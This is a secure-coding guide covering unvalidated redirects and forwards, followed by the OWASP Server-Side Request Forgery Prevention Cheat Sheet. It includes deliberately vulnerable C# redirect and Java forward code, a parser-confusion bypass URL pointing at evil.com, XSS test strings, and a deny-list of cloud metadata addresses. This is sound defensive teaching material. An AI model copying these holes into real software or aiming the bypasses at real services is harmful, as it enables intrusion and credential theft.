[ASP .NET MVC 1 & 2 websites](https://docs.microsoft.com/en-us/aspnet/mvc/overview/security/preventing-open-redirection-attacks) are particularly vulnerable to open redirection attacks. In order to avoid this vulnerability, you need to apply MVC 3.

The code for the LogOn action in an ASP.NET MVC 2 application is shown below. After a successful login, the controller returns a redirect to the returnUrl. You can see that no validation is being performed against the returnUrl parameter.

ASP.NET MVC 2 LogOn action in `AccountController.cs` (see Microsoft Docs link provided above for the context):

```csharp
[HttpPost]
 public ActionResult LogOn(LogOnModel model, string returnUrl)
 {
   if (ModelState.IsValid)
   {
     if (MembershipService.ValidateUser(model.UserName, model.Password))
     {
       FormsService.SignIn(model.UserName, model.RememberMe);
       if (!String.IsNullOrEmpty(returnUrl))
       {
         return Redirect(returnUrl);
       }
       else
       {
         return RedirectToAction("Index", "Home");
       }
     }
     else
     {
       ModelState.AddModelError("", "The user name or password provided is incorrect.");
     }
   }

   // If we got this far, something failed, redisplay form
   return View(model);
 }
```

#### Dangerous Forward Example

When applications allow user input to forward requests between different parts of the site, the application must check that the user is authorized to access the URL, perform the functions it provides, and it is an appropriate URL request.

If the application fails to perform these checks, an attacker crafted URL may pass the application's access control check and then forward the attacker to an administrative function that is not normally permitted.

Example:

```text
http://www.example.com/function.jsp?fwd=admin.jsp
```

The following code is a Java servlet that will receive a `GET` request with a URL parameter named `fwd` in the request to forward to the address specified in the URL parameter. The servlet will retrieve the URL parameter value [from the request](https://docs.oracle.com/javaee/7/api/javax/servlet/ServletRequest.html#getParameter-java.lang.String-) and complete the server-side forward processing before responding to the browser.

```java
public class ForwardServlet extends HttpServlet
{
  protected void doGet(HttpServletRequest request, HttpServletResponse response)
                    throws ServletException, IOException {
    String query = request.getQueryString();
    if (query.contains("fwd"))
    {
      String fwd = request.getParameter("fwd");
      try
      {
        request.getRequestDispatcher(fwd).forward(request, response);
      }
      catch (ServletException e)
      {
        e.printStackTrace();
      }
    }
  }
}
```

### Preventing Unvalidated Redirects and Forwards

Safe use of redirects and forwards can be done in a number of ways:

- Simply avoid using redirects and forwards.
- If used, do not allow the URL as user input for the destination.
- Where possible, have the user provide short name, ID or token which is mapped server-side to a full target URL.
    - This provides the highest degree of protection against the attack tampering with the URL.
    - Be careful that this doesn't introduce an enumeration vulnerability where a user could cycle through IDs to find all possible redirect targets
- If user input can’t be avoided, ensure that the supplied **value** is valid, appropriate for the application, and is **authorized** for the user.
- For local return URLs, use a framework helper that rejects non-local destinations, such as [ASP.NET Core LocalRedirect or IsLocalUrl](https://learn.microsoft.com/en-us/aspnet/core/security/preventing-open-redirects?view=aspnetcore-10.0).
- If external destinations are required, allow-list explicitly approved destinations using the parsed URL components, as described below.
- Force all redirects to first go through a page notifying users that they are going off of your site, with the destination clearly displayed, and have them click a link to confirm.

#### Validating URLs

Use a maintained URL parser compatible with the redirect API and browser URL interpretation. Compare the parsed scheme, canonical host, and effective port against an explicit allowlist; constrain the path when only specific endpoints are permitted. Reject userinfo and ambiguous input, and redirect using the validated URL rather than transforming it afterward. Do not use raw prefix or suffix matching: [GitLab demonstrates how userinfo and misleading hostnames bypass such checks](https://docs.gitlab.com/development/secure_coding_guidelines/ruby/#feature-specific-mitigations). A server-side mapping from an approved destination ID remains preferable to accepting arbitrary URLs.

## Server-Side Request Forgery Prevention

> **Source:** [Server-Side Request Forgery Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html) · [OWASP Cheat Sheet Series](https://github.com/OWASP/CheatSheetSeries), CC BY-SA 4.0

### Introduction

The objective of the cheat sheet is to provide advice regarding the protection against [Server Side Request Forgery](https://www.acunetix.com/blog/articles/server-side-request-forgery-vulnerability/) (SSRF) attack.

This cheat sheet will focus on the defensive point of view and will not explain how to perform this attack. This [talk](https://raw.githubusercontent.com/OWASP/CheatSheetSeries/master/assets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet_Orange_Tsai_Talk.pdf) from the security researcher [Orange Tsai](https://twitter.com/orange_8361) as well as this [document](https://raw.githubusercontent.com/OWASP/CheatSheetSeries/master/assets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet_SSRF_Bible.pdf) provide techniques on how to perform this kind of attack.

### Context

SSRF is an attack vector that abuses an application to interact with the internal/external network or the machine itself. One of the enablers for this vector is the mishandling of URLs, as showcased in the following examples:

- Image on an external server (*e.g.* user enters image URL of their avatar for the application to download and use).
- Custom [WebHook](https://en.wikipedia.org/wiki/Webhook) (users have to specify Webhook handlers or Callback URLs).
- Internal requests to interact with another service to serve a specific functionality. Most of the times, user data is sent along to be processed, and if poorly handled, can perform specific injection attacks.

### Overview of a SSRF common flow

![SSRF Common Flow](https://raw.githubusercontent.com/OWASP/CheatSheetSeries/master/assets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet_SSRF_Common_Flow.png)

*Notes:*

- SSRF is not limited to the HTTP protocol. Generally, the first request is HTTP, but in cases where the application itself performs the second request, it could use different protocols (*e.g.* FTP, SMB, SMTP, etc.) and schemes (*e.g.* `file://`, `phar://`, `gopher://`, `data://`, `dict://`, etc.).
- If the application is vulnerable to [XML eXternal Entity (XXE) injection](https://portswigger.net/web-security/xxe) then it can be exploited to perform a [SSRF attack](https://portswigger.net/web-security/xxe#exploiting-xxe-to-perform-ssrf-attacks), take a look at the [XXE cheat sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html) to learn how to prevent the exposure to XXE.

### Cases

Depending on the application's functionality and requirements, there are two basic cases in which SSRF can happen:

- Application can send request only to **identified and trusted applications**: Case when [allowlist](https://en.wikipedia.org/wiki/Whitelisting) approach is available.
- Application can send requests to **ANY external IP address or domain name**: Case when [allowlist](https://en.wikipedia.org/wiki/Whitelisting) approach is unavailable.

Because these two cases are very different, this cheat sheet will describe defenses against them separately.

#### Case 1 - Application can send request only to identified and trusted applications

Sometimes, an application needs to perform a request to another application, often located on another network, to perform a specific task. Depending on the business case, user input is required for the functionality to work.

##### Example

 > Take the example of a web application that receives and uses personal information from a user, such as their first name, last name, birth date etc. to create a profile in an internal HR system. By design, that web application will have to communicate using a protocol that the HR system understands to process that data.
 > Basically, the user cannot reach the HR system directly, but, if the web application in charge of receiving user information is vulnerable to SSRF, the user can leverage it to access the HR system.
 > The user leverages the web application as a proxy to the HR system.

The allowlist approach is a viable option since the internal application called by the *VulnerableApplication* is clearly identified in the technical/business flow. It can be stated that the required calls will only be targeted between those identified and trusted applications.

##### Available protections

Several protective measures are possible at the **Application** and **Network** layers. To apply the **defense in depth** principle, both layers will be hardened against such attacks.

###### Application layer

The first level of protection that comes to mind is [Input validation](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html).

Based on that point, the following question comes to mind: *How to perform this input validation?*

As [Orange Tsai](https://twitter.com/orange_8361) shows in his [talk](https://raw.githubusercontent.com/OWASP/CheatSheetSeries/master/assets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet_Orange_Tsai_Talk.pdf), depending on the programming language used, parsers can be abused. One possible countermeasure is to apply the [allowlist approach](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html#allowlist-vs-denylist) when input validation is used because, most of the time, the format of the information expected from the user is globally known.

The request sent to the internal application will be based on the following information:

- String containing business data.
- IP address (V4 or V6).
- Domain name.
- URL.

**Note:** Disable the support for the following of the [redirection](https://developer.mozilla.org/en-US/docs/Web/HTTP/Redirections) in your web client in order to prevent the bypass of the input validation described in the section `Exploitation tricks > Bypassing restrictions > Input validation > Unsafe redirect` of this [document](https://raw.githubusercontent.com/OWASP/CheatSheetSeries/master/assets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet_SSRF_Bible.pdf).

###### String

In the context of SSRF, validations can be added to ensure that the input string respects the business/technical format expected.

A [regex](https://www.regular-expressions.info/) can be used to ensure that data received is valid from a security point of view if the input data have a simple format (*e.g.* token, zip code, etc.). Otherwise, validation should be conducted using the libraries available from the `string` object because regex for complex formats are difficult to maintain and are highly error-prone.

User input is assumed to be non-network related and consists of the user's personal information.

Example:

```java
//Regex validation for a data having a simple format
if(Pattern.matches("[a-zA-Z0-9\\s\\-]{1,50}", userInput)){
    //Continue the processing because the input data is valid
}else{
    //Stop the processing and reject the request
}
```

###### IP address

In the context of SSRF, there are 2 possible validations to perform:

1. Ensure that the data provided is a valid IP V4 or V6 address.
2. Ensure that the IP address provided belongs to one of the IP addresses of the identified and trusted applications.

The first layer of validation can be applied using libraries that ensure the security of the IP address format, based on the technology used (library option is proposed here to delegate the managing of the IP address format and leverage battle-tested validation function):

> Verification of the proposed libraries has been performed regarding the exposure to bypasses (Hex, Octal, Dword, URL and Mixed encoding) described in this [article](https://medium.com/@vickieli/bypassing-ssrf-protection-e111ae70727b).

- **JAVA:** Method [InetAddressValidator.isValid](http://commons.apache.org/proper/commons-validator/apidocs/org/apache/commons/validator/routines/InetAddressValidator.html#isValid(java.lang.String)) from the [Apache Commons Validator](http://commons.apache.org/proper/commons-validator/) library.
    - **It is NOT exposed** to bypass using Hex, Octal, Dword, URL and Mixed encoding.
- **.NET**: Method [IPAddress.TryParse](https://docs.microsoft.com/en-us/dotnet/api/system.net.ipaddress.tryparse?view=netframework-4.8) from the SDK.
    - **It is exposed** to bypass using Hex, Octal, Dword and Mixed encoding but **NOT** the URL encoding.
    - As allowlisting is used here, any bypass tentative will be blocked during the comparison against the allowed list of IP addresses.
- **JavaScript**: Library [ip-address](https://www.npmjs.com/package/ip-address).
    - **It is NOT exposed** to bypass using Hex, Octal, Dword, URL and Mixed encoding.
- **Ruby**: Class [IPAddr](https://ruby-doc.org/stdlib-2.0.0/libdoc/ipaddr/rdoc/IPAddr.html) from the SDK.
    - **It is NOT exposed** to bypass using Hex, Octal, Dword, URL and Mixed encoding.

> **Use the output value of the method/library as the IP address to compare against the allowlist.**

After ensuring the validity of the incoming IP address, the second layer of validation is applied. An allowlist is created after determining all the IP addresses (v4 and v6 to avoid bypasses) of the identified and trusted applications. The valid IP is cross-checked with that list to ensure its communication with the internal application (string strict comparison with case sensitive).

###### Domain name

In the attempt of validate domain names, it is apparent to do a DNS resolution to verify the existence of the domain. In general, it is not a bad idea, yet it opens up the application to attacks depending on the configuration used regarding the DNS servers used for the domain name resolution:

- It can disclose information to external DNS resolvers.
- It can be used by an attacker to bind a legit domain name to an internal IP address. See the section `Exploitation tricks > Bypassing restrictions > Input validation > DNS pinning` of this [document](https://raw.githubusercontent.com/OWASP/CheatSheetSeries/master/assets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet_SSRF_Bible.pdf).
- An attacker can use it to deliver a malicious payload to the internal DNS resolvers and the API (SDK or third-party) used by the application to handle the DNS communication and then, potentially, trigger a vulnerability in one of these components.

In the context of SSRF, there are two validations to perform:

1. Ensure that the data provided is a valid domain name.
2. Ensure that the domain name provided belongs to one of the domain names of the identified and trusted applications (the allowlisting comes to action here).

Similar to the IP address validation, the first layer of validation can be applied using libraries that ensure the security of the domain name format, based on the technology used (library option is proposed here in order to delegate the managing of the domain name format and leverage battle tested validation function):

> Verification of the proposed libraries has been performed to ensure that the proposed functions do not perform any DNS resolution query.

- **JAVA:** Method [DomainValidator.isValid](https://commons.apache.org/proper/commons-validator/apidocs/org/apache/commons/validator/routines/DomainValidator.html#isValid(java.lang.String)) from the [Apache Commons Validator](http://commons.apache.org/proper/commons-validator/) library.
- **.NET**: Method [Uri.CheckHostName](https://docs.microsoft.com/en-us/dotnet/api/system.uri.checkhostname?view=netframework-4.8) from the SDK.
- **JavaScript**: Library [is-valid-domain](https://www.npmjs.com/package/is-valid-domain).
- **Python**: Module [validators.domain](https://validators.readthedocs.io/en/latest/#module-validators.domain).
- **Ruby**: No valid dedicated gem has been found.
    - [domainator](https://github.com/mhuggins/domainator), [public_suffix](https://github.com/weppos/publicsuffix-ruby) and [addressable](https://github.com/sporkmonger/addressable) has been tested but unfortunately they all consider `<script>alert(1)</script>.owasp.org` as a valid domain name.
    - This regex, taken from [here](https://stackoverflow.com/a/26987741), can be used: `^(((?!-))(xn--|_{1,1})?[a-z0-9-]{0,61}[a-z0-9]{1,1}\.)*(xn--)?([a-z0-9][a-z0-9\-]{0,60}|[a-z0-9-]{1,30}\.[a-z]{2,})$`

Example of execution of the proposed regex for Ruby:

```ruby
domain_names = ["owasp.org","owasp-test.org","doc-test.owasp.org","doc.owasp.org",
                "<script>alert(1)</script>","<script>alert(1)</script>.owasp.org"]
domain_names.each { |domain_name|
    if ( domain_name =~ /^(((?!-))(xn--|_{1,1})?[a-z0-9-]{0,61}[a-z0-9]{1,1}\.)*(xn--)?([a-z0-9][a-z0-9\-]{0,60}|[a-z0-9-]{1,30}\.[a-z]{2,})$/ )
        puts "[i] #{domain_name} is VALID"
    else
        puts "[!] #{domain_name} is INVALID"
    end
}
```

```bash
$ ruby test.rb
[i] owasp.org is VALID
[i] owasp-test.org is VALID
[i] doc-test.owasp.org is VALID
[i] doc.owasp.org is VALID
[!] <script>alert(1)</script> is INVALID
[!] <script>alert(1)</script>.owasp.org is INVALID
```

After ensuring the validity of the incoming domain name, the second layer of validation is applied:

1. Build an allowlist with all the domain names of every identified and trusted applications.
2. Verify that the domain name received is part of this allowlist (string strict comparison with case sensitive).

Domain allowlisting alone does not prevent DNS rebinding. Validate the resolved destination IP addresses against the application's permitted networks, then ensure the HTTP client connects only to validated addresses. A second, unchecked DNS lookup between validation and connection can bypass these checks; see [GitLab's URL blocker guidance](https://docs.gitlab.com/development/secure_coding_guidelines/ruby/#url-blocker--validation-libraries).

Use an HTTP client mechanism that connects to the validated IP while preserving the original hostname for the HTTP `Host` header, TLS Server Name Indication (SNI), and certificate verification, as illustrated by [curl's custom address resolution](https://everything.curl.dev/usingcurl/connections/name.html#provide-a-custom-ip-address-for-a-name). Apply the destination policy to retries and fallback connections as well. The following DNS configuration and monitoring provide additional detection, not a substitute for connection-time enforcement:

1. Ensure that the domains that are part of your organization are resolved by your internal DNS server first in the chains of DNS resolvers.
2. Monitor the domains allowlist in order to detect when any of them resolves to a/an:
   - Local IP address (V4 + V6).
   - Internal IP of your organization (expected to be in private IP ranges) for the domain that are not part of your organization.

The following Python3 script can be used, as a starting point, for the monitoring mentioned above:

```python
# Dependencies: pip install ipaddress dnspython
import ipaddress
import dns.resolver

# Configure the allowlist to check
DOMAINS_ALLOWLIST = ["owasp.org", "labslinux"]

# Configure the DNS resolver to use for all DNS queries
DNS_RESOLVER = dns.resolver.Resolver()
DNS_RESOLVER.nameservers = ["1.1.1.1"]

def verify_dns_records(domain, records, type):
    """
    Verify if one of the DNS records resolve to a non public IP address.
    Return a boolean indicating if any error has been detected.
    """
    error_detected = False
    if records is not None:
        for record in records:
            value = record.to_text().strip()
            try:
                ip = ipaddress.ip_address(value)
                # See https://docs.python.org/3/library/ipaddress.html#ipaddress.IPv4Address.is_global
                if not ip.is_global:
                    print("[!] DNS record type '%s' for domain name '%s' resolve to
                    a non public IP address '%s'!" % (type, domain, value))
                    error_detected = True
            except ValueError:
                error_detected = True
                print("[!] '%s' is not valid IP address!" % value)
    return error_detected

def check():
    """
    Perform the check of the allowlist of domains.
    Return a boolean indicating if any error has been detected.
    """
    error_detected = False
    for domain in DOMAINS_ALLOWLIST:
        # Get the IPs of the current domain
        # See https://en.wikipedia.org/wiki/List_of_DNS_record_types
        try:
            # A = IPv4 address record
            ip_v4_records = DNS_RESOLVER.query(domain, "A")
        except Exception as e:
            ip_v4_records = None
            print("[i] Cannot get A record for domain '%s': %s\n" % (domain,e))
        try:
            # AAAA = IPv6 address record
            ip_v6_records = DNS_RESOLVER.query(domain, "AAAA")
        except Exception as e:
            ip_v6_records = None
            print("[i] Cannot get AAAA record for domain '%s': %s\n" % (domain,e))
        # Verify the IPs obtained
        if verify_dns_records(domain, ip_v4_records, "A")
        or verify_dns_records(domain, ip_v6_records, "AAAA"):
            error_detected = True
    return error_detected

if __name__== "__main__":
    if check():
        exit(1)
    else:
        exit(0)
```

###### URL

Do not accept complete URLs from the user because URL are difficult to validate and the parser can be abused depending on the technology used as showcased by the following [talk](https://raw.githubusercontent.com/OWASP/CheatSheetSeries/master/assets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet_Orange_Tsai_Talk.pdf) of [Orange Tsai](https://twitter.com/orange_8361).

If network related information is really needed then only accept a valid IP address or domain name.

**Match the host against an allowlist, and build the request yourself.** The input here is an IP address or a domain name rather than a whole URL, so compare that value against an explicit [allowlist](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html#allowlist-vs-denylist) of permitted destinations, then build the request from the entry that matched, together with a scheme, port and path the application fixes itself. Where that host was extracted from a URL the user supplied, do not copy the other components of that URL across either: carrying its path or query through, rather than rebuilding them, hands the next component something it has to parse again.

**Treat parser disagreement as a rejection.** Where a URL does cross a service boundary as a string and is parsed again at the other end, two implementations can read different hosts from the same bytes. `http://example.com\@evil.com` is such a string: a parser following the [WHATWG URL Standard](https://url.spec.whatwg.org/#url-parsing) treats the backslash under a special scheme as a path separator and reads the host as `example.com`, while the `userinfo` grammar in [RFC 3986](https://www.rfc-editor.org/rfc/rfc3986#section-3.2.1) admits no backslash at all, so the string is not a URI that RFC defines. An implementation that does not enforce the grammar still returns a host, because it takes everything before the final `@` to be userinfo: CPython's [`urllib.parse`](https://docs.python.org/3/library/urllib.parse.html#urllib.parse.urlsplit) derives the host with [`netloc.rpartition('@')`](https://github.com/python/cpython/blob/v3.11.15/Lib/urllib/parse.py#L208), so `urlsplit("http://example.com\@evil.com").hostname` returns `evil.com`. Reject a URL whose host is not read identically by every parser in play, rather than reconciling the readings.

###### Network layer

The objective of the Network layer security is to prevent the *VulnerableApplication* from performing calls to arbitrary applications. Only allowed *routes* will be available for this application in order to limit its network access to only those that it should communicate with.

The Firewall component, as a specific device or using the one provided within the operating system, will be used here to define the legitimate flows.

In the schema below, a Firewall component is leveraged to limit the application's access, and in turn, limit the impact of an application vulnerable to SSRF:

![Case 1 for Network layer protection about flows that we want to prevent](https://raw.githubusercontent.com/OWASP/CheatSheetSeries/master/assets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet_Case1_NetworkLayer_PreventFlow.png)

[Network segregation](https://www.mwrinfosecurity.com/our-thinking/making-the-case-for-network-segregation) (see this set of [implementation advice](https://www.cyber.gov.au/acsc/view-all-content/publications/implementing-network-segmentation-and-segregation) can also be leveraged and **is highly recommended in order to block illegitimate calls directly at network level itself**.

#### Case 2 - Application can send requests to ANY external IP address or domain name

This case happens when a user can control a URL to an **External** resource and the application makes a request to this URL (e.g. in case of [WebHooks](https://en.wikipedia.org/wiki/Webhook)). Allow lists cannot be used here because the list of IPs/domains is often unknown upfront and is dynamically changing.

In this scenario, *External* refers to any IP that doesn't belong to the internal network, and should be reached by going over the public internet.

Thus, the call from the *Vulnerable Application*:

- **Is NOT** targeting one of the IP/domain *located inside* the company's global network.
- Uses a convention defined between the *VulnerableApplication* and the expected IP/domain in order to *prove* that the call has been legitimately initiated.

##### Challenges in blocking URLs at application layer

Based on the business requirements of the above mentioned applications, the allowlist approach is not a valid solution. Despite knowing that the block-list approach is not an impenetrable wall, it is the best solution in this scenario. It is informing the application what it should **not** do.

Here is why filtering URLs is hard at the Application layer:

- It implies that the application must be able to detect, at the code level, that the provided IP (V4 + V6) is not part of the official [private networks ranges](https://en.wikipedia.org/wiki/Private_network) including also *localhost* and *IPv4/v6 Link-Local* addresses. Not every SDK provides a built-in feature for this kind of verification, and leaves the handling up to the developer to understand all of its pitfalls and possible values, which makes it a demanding task.
- Same remark for domain name: The company must maintain a list of all internal domain names and provide a centralized service to allow an application to verify if a provided domain name is an internal one. For this verification, an internal DNS resolver can be queried by the application but this internal DNS resolver must not resolve external domain names.

##### Available protections

Taking into consideration the same assumption in the following [example](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html#example) for the following sections.

###### Application layer

Like for the case [n°1](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html#case-1---application-can-send-request-only-to-identified-and-trusted-applications), it is assumed that the `IP Address` or `domain name` is required to create the request that will be sent to the *TargetApplication*.

The first validation on the input data presented in the case [n°1](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html#application-layer) on the 3 types of data will be the same for this case **BUT the second validation will differ**. Indeed, here we must use the block-list approach.

> **Regarding the proof of legitimacy of the request**: The *TargetedApplication* that will receive the request must generate a random token (ex: alphanumeric of 20 characters) that is expected to be passed by the caller (in body via a parameter for which the name is also defined by the application itself and only allow characters set `[a-z]{1,10}`) to perform a valid request. The receiving endpoint must only accept HTTP POST requests.

**Validation flow (if one the validation steps fail then the request is rejected):**

1. The application will receive the IP address or domain name of the *TargetedApplication* and it will apply the first validation on the input data using the libraries/regex mentioned in this [section](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html#application-layer).
2. The second validation will be applied against the IP address or domain name of the *TargetedApplication* using the following block-list approach:
   - For IP address:
     - The application will verify that it is a public one (see the hint provided in the next paragraph with the python code sample).
   - For domain name:
        1. The application will verify that it is a public one by trying to resolve the domain name against the DNS resolver that will only resolve internal domain name. Here, it must return a response indicating that it do not know the provided domain because the expected value received must be a public domain.
        2. Retrieve all the IP addresses behind the domain name (records *A* + *AAAA* for IPv4 + IPv6) and apply the same public-address verification described above. Bind the connection to a validated address as described under [domain name validation](#domain-name); checking DNS answers separately does not prevent DNS rebinding.
3. The application will receive the protocol to use for the request via a dedicated input parameter for which it will verify the value against an allowed list of protocols (`HTTP` or `HTTPS`).
4. The application will receive the parameter name for the token to pass to the *TargetedApplication* via a dedicated input parameter for which it will only allow the characters set `[a-z]{1,10}`.
5. The application will receive the token itself via a dedicated input parameter for which it will only allow the characters set `[a-zA-Z0-9]{20}`.
6. The application will receive and validate (from a security point of view) any business data needed to perform a valid call.
7. The application will build the HTTP POST request **using only validated information** and connect only to an IP address validated in step 2 (*don't forget to disable the support for [redirection](https://developer.mozilla.org/en-US/docs/Web/HTTP/Redirections) in the web client used*).

###### Network layer

Similar to the following [section](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html#network-layer).

### IMDSv2 in AWS

In cloud environments SSRF is often used to access and steal credentials and access tokens from metadata services (e.g. AWS Instance Metadata Service, Azure Instance Metadata Service, GCP metadata server).

[IMDSv2](https://aws.amazon.com/blogs/security/defense-in-depth-open-firewalls-reverse-proxies-ssrf-vulnerabilities-ec2-instance-metadata-service/) is an additional defense-in-depth mechanism for AWS that mitigates some of the instances of SSRF.

To leverage this protection migrate to IMDSv2 and disable old IMDSv1. Check out [AWS documentation](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html) for more details.

### Deny-list (Last Resort)

**Deny-lists are bypass-prone. Prefer allow-lists.**

**When unavoidable, block these minimum ranges:**

| Service | Block IPs/Domains |
|---------|-------------------|
| **AWS IMDS** | `169.254.169.254`, `metadata.amazonaws.com` |
| **GCP Metadata** | `metadata.google.internal`, `169.254.169.254` |
| **Azure IMDS** | `169.254.169.254` |
| **Localhost** | `127.0.0.0/8`, `0.0.0.0/8`, `::1/128` |
| **RFC1918 Private** | `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16` |
| **IPv6 Unique Local** | `fc00::/7` ([RFC 4193](https://datatracker.ietf.org/doc/html/rfc4193#section-3.1)) |
| **IPv6 Link-Local** | `fe80::/10` ([RFC 4291](https://datatracker.ietf.org/doc/html/rfc4291#section-2.5.6)) |
| **Multicast** | `224.0.0.0/4`, `ff00::/8` |

**Full production example:** [ComputerCraft SSRF deny-list](https://github.com/cc-tweaked/CC-Tweaked/blob/b9ed66983d714bcb5c6bf15b428e01a035106dbf/projects/core/src/main/java/dan200/computercraft/core/apis/http/options/AddressPredicate.java#L112-L157)

**Sources:**

- [IANA IPv4 Special Registry](https://www.iana.org/assignments/iana-ipv4-special-registry/iana-ipv4-special-registry.xhtml)
- [IANA IPv6 Special Registry](https://www.iana.org/assignments/iana-ipv6-special-registry/iana-ipv6-special-registry.xhtml)

### Semgrep Rules

[Semgrep](https://semgrep.dev/) is a command-line tool for offline static analysis. Use pre-built or custom rules to enforce code and security standards in your codebase.
Explore the [Semgrep rules](https://semgrep.dev/r?q=ssrf) for SSRF to effectively identify and investigate potential SSRF vulnerabilities.

### Tools and code used for schemas

- [Mermaid Online Editor](https://mermaidjs.github.io/mermaid-live-editor) and [Mermaid documentation](https://mermaidjs.github.io/).
- [Draw.io Online Editor](https://www.draw.io/).

Mermaid code for SSRF common flow (printscreen are used to capture PNG image inserted into this cheat sheet):

```text
sequenceDiagram
    participant Attacker
    participant VulnerableApplication
    participant TargetedApplication
    Attacker->>VulnerableApplication: Crafted HTTP request
    VulnerableApplication->>TargetedApplication: Request (HTTP, FTP...)
    Note left of TargetedApplication: Use payload included<br>into the request to<br>VulnerableApplication
    TargetedApplication->>VulnerableApplication: Response
    VulnerableApplication->>Attacker: Response
    Note left of VulnerableApplication: Include response<br>from the<br>TargetedApplication
```

Draw.io schema XML code for the "[case 1 for network layer protection about flows that we want to prevent](https://raw.githubusercontent.com/OWASP/CheatSheetSeries/master/assets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet_Case1_NetworkLayer_PreventFlow.xml)" schema (printscreen are used to capture PNG image inserted into this cheat sheet).
